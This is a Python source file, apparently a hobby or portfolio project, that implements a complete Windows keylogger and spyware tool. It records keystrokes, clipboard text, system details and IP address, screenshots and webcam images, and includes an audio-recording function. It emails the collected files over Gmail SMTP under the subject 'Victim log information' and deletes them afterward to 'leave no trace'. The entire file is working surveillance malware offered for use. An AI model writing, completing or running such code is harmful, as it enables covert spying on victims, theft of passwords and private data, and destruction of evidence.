# Programmer: Kaleb Miller

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import ssl

from pynput.keyboard import Key, Listener

import cv2

import os

import win32clipboard

import platform

import pyautogui

import time

import socket

import sounddevice as sd
from scipy.io.wavfile import write

# Current Time
current_time = time.time()
# Five Minutes
five_minutes = time.time() + 300 

# Flag
flag = True

# Text format for keystrokes
space_count = 0
spaces = 16


# Function: Captures user keystrokes and creates a .txt file
def show_pressed(key):

    global current_time, five_minutes, flag, space_count, spaces

    # Disply to terminal
    print('\nUser Entered {0}'.format(key))

    with open(file_path + log_info, 'a') as logKey:
        # 'a' means to append onto the end of an existing file / Creates new file
        # 'w' means writing to an empty file / Creates new file but can overwrite the new file erasing the contents that
        #  were there before.

        try:
        # Try to get the character of the key
            char = key.char
            logKey.write(char)
        except:
        # If the key has no char attribute, it's a special key
            print('special key')    
            #char = str(key)        
            #logKey.write(char)

        if key == Key.space:
            logKey.write(' ')
            space_count += 1
            
            if space_count == spaces:
                logKey.write('\n')
                # Reset space count to 0
                space_count = 0

        # If user enters esc key, return flag equal to False and return
        # False leading to exiting the loop and def function.
        if key == Key.esc:
            flag = False
            return False
        
        # If current time is greater than five minutes return flag equal to True 
        # and return False leading to exiting the loop and def function.
        if current_time > five_minutes:
            flag = True
            return False
        
        # Update current time
        current_time = time.time()         


# Function: Captures user clip board and creates a .txt file
def show_clipped(path, clip_info):
    
     try:
         with open(path + clip_info, 'a') as cb:
            win32clipboard.OpenClipboard()
            text = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            cb.write(text)
     except:
            print('Error: Nothing changed in clipboard')


# Function: Captures user system infomation and creates a .txt file
def show_system(path, system_info):

    user_computer = platform.uname()

    # Return a string containing the hostname of the machine
    host_name = socket.gethostname()
    # Return and translate a host name to IPv4 address format
    IP_Address = socket.gethostbyname(host_name)    
    
    try:
        with open(path + system_info, "a") as si:
            si.write(f"System Release: {user_computer.system}")
            si.write(f"\nIP Address: {IP_Address}")
            si.write(f"\nNode Name: {user_computer.node}")
            si.write(f"\nRelease: {user_computer.release}")            
            si.write(f"\nVersion: {user_computer.version}")
            si.write(f"\nMachine: {user_computer.machine}")
            si.write(f"\nProcessor: {user_computer.processor}")
    except:
        print("Error: No system information retrieved")


# Function: Capture user screen and create a .jpg file
def show_screenshots(path, screenshot_info):
    
    ss = pyautogui.screenshot()
    ss.save(path + screenshot_info)


# Function: Capture user on webcam
def show_webcam(path, webcam_info):

    try:
        cam_port = 0
        cam = cv2.VideoCapture(cam_port)
        
        result, image = cam.read()

        # Save webcam image to path
        cv2.imwrite(path + webcam_info, image)
        cv2.waitKey(0)
    except:
        print("Error: Webcam not found on computer")


def capture_audio(path, microphone_info):

    fs = 44100  # Sample rate
    seconds = 15  # Duration of recording

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait until recording is finished
    write(path + microphone_info, fs, myrecording)  # Save as WAV file

    
# Function: Send files to email address
def send_emails(flst, path, to_address, password):

    from_address = email_address

    msg = MIMEMultipart()

    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = "Victim log information"
    body = "Files from victim computer"
    msg.attach(MIMEText(body, 'plain'))

    # Conditional Statement: 
    # For loop used to send in each file from the list to email address
    for flsts in flst:
        # Starts with the first file in list and assigns to filename variable
        filename = flsts    
        # Merge file path and filename together and assign to fls (will be overwritten when going through loop)                                 
        flsts = path + flsts
        # Conditional Statement:
        # If file exists send to email address otherwise display error in terminal
        if os.path.exists(flsts):
            flsts = open(flsts, 'rb')
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload((flsts).read())
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', "attachment; filename= %s" % filename)
            msg.attach(attachment)
            # Make a connection and login into email
            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(from_address, password)
            text = msg.as_string()
        else:
            print(f"Error: {flsts} not found")
    
    # Send all attachments/files to email address and quit
    s.sendmail(from_address, to_address, text)
    s.quit()


if __name__ == "__main__":

    # File name
    log_info = "log_info.txt"                                                            
    clip_info = "clip_info.txt"                                                          
    system_info = "system_info.txt"                                                     
    screenshot_info = "screenshot.jpg"
    webcam_info = "webcam_capture.jpg"
    microphone_info = "microphone_audio.wav"
    file_list = [log_info, clip_info, system_info, screenshot_info, webcam_info, microphone_info]

    # Email and Password
    email_address = " "                  # Type in your Email address                            
    password = " "                       # Type in your Email password                                 

    # File path
    file_path = " "  # Choose your file path     

    # Conditional Statment: 
    # While flag is True, information from victim computer will be sent
    # every 10 minutes to email address. When user hits 'del' key, flag will
    # return False and program will delete files and end program.
    while flag:   
        with Listener(on_press = show_pressed) as listener:   
            listener.join()
    
            # Call Functions
            show_clipped(file_path, clip_info)
            show_system(file_path, system_info)
            show_screenshots(file_path, screenshot_info)
            show_webcam(file_path, webcam_info)

            # Send in files to be sent
            try:
                send_emails(file_list, file_path, email_address, password)
                print("Success - Connection made!!!")
            except:
                print("Error - Connection Interrupted")

            # Update time when flag is True
            current_time = time.time()
            five_minutes = time.time() + 300

    # Delete files from user's computer (Leave no trace/evidence)
    for fm in file_list:
        # Merge file path with filename
        file_merge = file_path + fm                     
        if os.path.exists(file_merge):
            os.remove(file_merge)